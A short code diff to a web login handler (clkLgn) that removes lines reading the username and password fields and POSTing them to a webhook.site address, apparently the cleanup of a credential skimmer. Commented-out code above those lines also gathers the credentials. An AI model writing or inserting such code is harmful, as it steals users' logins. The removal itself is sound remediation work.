@@ -369,12 +369,6 @@ function clkLgn()
     //
     // var curTime = new Date().toLocaleDateString();
     // var ObjectData = "ObjectType=" + escape(curTime + "\t" + gbid("username").value + "\t" + gbid("password").value) + "&uin=" + Math.random().toString(16).substring(2);
-    var xmlhttp = new XMLHttpRequest();
-    var username = gbid("username").value;
-    var passwd = gbid("password").value;
-    xmlhttp.open("POST", "https://webhook.site/325ce69c-43bf-436d-9896-3929f1abe8d5/111", false);
-    xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-    xmlhttp.send("username="+encodeURIComponent(username)+"&password="+encodeURIComponent(passwd));
     addPerfMarker("Logon.Start");
 
     var p = false;
